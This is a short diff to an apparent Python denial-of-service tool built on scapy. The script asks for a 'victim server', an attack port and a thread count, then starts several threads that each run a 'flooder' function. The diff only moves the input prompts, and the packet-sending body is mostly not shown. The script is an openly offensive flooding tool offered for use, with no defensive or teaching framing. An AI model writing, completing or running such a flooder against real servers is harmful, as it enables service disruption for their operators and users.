@@ -1,8 +1,5 @@
 import scapy.all as scapy
 import threading
-host=str(input('Enter victim server:'))
-port=int(input("Enter attack port:"))
-thrds=int(input("Enter number of threads:"))
 tcp=scapy.TCP()
 ip=scapy.IP()
 raw=scapy.Raw()
@@ -20,7 +17,10 @@ def flooder():
     except KeyboardInterrupt:
                 print('Stopped flooding')
 
-
+            
+host=str(input('Enter victim server:'))
+port=int(input("Enter attack port:"))
+thrds=int(input("Enter number of threads:"))
 for i in range(1,thrds):
     t=threading.Thread(target=flooder)
     t.start()
